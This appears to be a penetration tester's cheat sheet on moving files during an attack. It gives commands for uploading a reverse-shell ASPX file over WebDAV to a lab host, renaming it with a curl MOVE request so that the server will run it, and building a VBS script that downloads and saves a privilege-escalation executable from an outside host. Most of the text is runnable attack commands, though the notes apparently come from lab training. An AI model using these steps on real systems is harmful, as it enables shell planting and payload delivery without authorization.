# File Transfer


## HTTP Server

> python -m SimpleHTTPServer 8000

> python3 -m http.server 8000


## SMB File Upload

**Method 1: Cadaver**

```
cadaver http://10.11.1.13/scripts/
put /root/Desktop/shellLER/phpReverseShell/aspunstage.aspx
```

**Method 2: Smbclient**

```
$ smbclient //server/share -c 'cd c:/remote/path ; put local-file'
```
Second example
```
smbclient -W ENGR_STUDENT -U EngrID //hnas.engr.uconn.edu/EngrGroupMixed
get <somethingRecieve>.tgz
put <somethingSend>.tgz
```

**Method 3: CURL**

Change file name with MOVE method. aspx -> asp

```
curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp" "http://10.11.1.13/scripts/aspunstaged.aspx"
```

## VBS Script

Code:

```
 echo Set args = Wscript.Arguments  >> webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  >> webdl.vbs
 timeout 1
 echo xHttp.Send  >> webdl.vbs
 timeout 1
 echo with bStrm      >> webdl.vbs
 timeout 1
 echo 	.type = 1 '      >> webdl.vbs
 timeout 1
 echo 	.open      >> webdl.vbs
 timeout 1
 echo 	.write xHttp.responseBody      >> webdl.vbs
 timeout 1
 echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
 timeout 1
 echo end with >> webdl.vbs
 timeout 1
 echo
```

File can be run using following syntax

```
C:\temp\cscript.exe webdl.vbs
```

